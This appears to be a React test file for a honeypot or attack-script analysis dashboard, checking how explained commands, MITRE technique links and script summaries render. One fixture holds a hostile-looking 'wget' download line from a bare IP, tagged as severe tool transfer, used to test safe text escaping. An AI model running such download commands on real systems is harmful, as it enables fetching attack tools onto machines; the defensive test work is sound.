import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
import { render, screen } from "@testing-library/react"
import { MemoryRouter } from "react-router"
import { describe, expect, it } from "vitest"
import { IpMaskProvider } from "@/app/ip-mask"
import { ExplainedLines } from "@/components/scripts/explained-lines"
import { ScriptRow } from "@/components/scripts/script-row"
import { TooltipProvider } from "@/components/ui/tooltip"
import type { ExplainedLine, ScriptItem } from "@/lib/scripts"

function wrap(ui: React.ReactNode) {
  const client = new QueryClient()
  return render(
    <QueryClientProvider client={client}>
      <MemoryRouter>
        <IpMaskProvider>
          <TooltipProvider>{ui}</TooltipProvider>
        </IpMaskProvider>
      </MemoryRouter>
    </QueryClientProvider>,
  )
}

describe("ExplainedLines", () => {
  const lines: ExplainedLine[] = [
    {
      n: 1,
      text: "wget <url>",
      raw: "wget http://198.51.100.23/<b>x</b>",
      explanation: "Downloads a file.",
      risk: "severe",
      technique: "T1105",
      technique_name: "Ingress Tool Transfer",
      rule: "download",
    },
    {
      n: 2,
      text: "frob",
      raw: "frob",
      explanation: "No built-in explanation for this command yet.",
      risk: null,
      technique: null,
      technique_name: null,
      rule: null,
    },
  ]
  it("shows commands as plain text and techniques as links to the filtered library", () => {
    wrap(<ExplainedLines lines={lines} />)
    expect(screen.getByText("wget http://198.51.100.23/<b>x</b>")).toBeInTheDocument()
    expect(document.querySelector("code b")).toBeNull()
    const link = screen.getByRole("link", { name: /T1105/ })
    expect(link).toHaveAttribute("href", "/scripts?technique=T1105")
    expect(screen.getByText("Severe")).toBeInTheDocument()
  })
})

describe("ScriptRow", () => {
  const item: ScriptItem = {
    id: 9,
    fingerprint: "00".repeat(32),
    summary: "A 2-step script that identifies the system and checks its privileges.",
    preview: ["uname -a", "whoami"],
    line_count: 2,
    first_seen: "2026-10-20T10:00:00Z",
    last_seen: "2026-10-23T10:00:00Z",
    sessions: 1500,
    sources: 20,
    sensors: ["ssh"],
    techniques: [],
    campaign_id: 3,
    campaign_name: "Recon wave",
    risk: "info",
    is_new: true,
  }
  it("is one link to the script, with a campaign link beside it", () => {
    wrap(<ScriptRow item={item} />)
    expect(screen.getByText(item.summary ?? "")).toBeInTheDocument()
    expect(screen.getAllByText("1,500").length).toBeGreaterThan(0)
    expect(screen.getByText("New this week")).toBeInTheDocument()
    const hrefs = screen.getAllByRole("link").map((a) => a.getAttribute("href"))
    expect(hrefs).toContain("/scripts/9")
    expect(hrefs).toContain("/campaigns/3")
  })
})
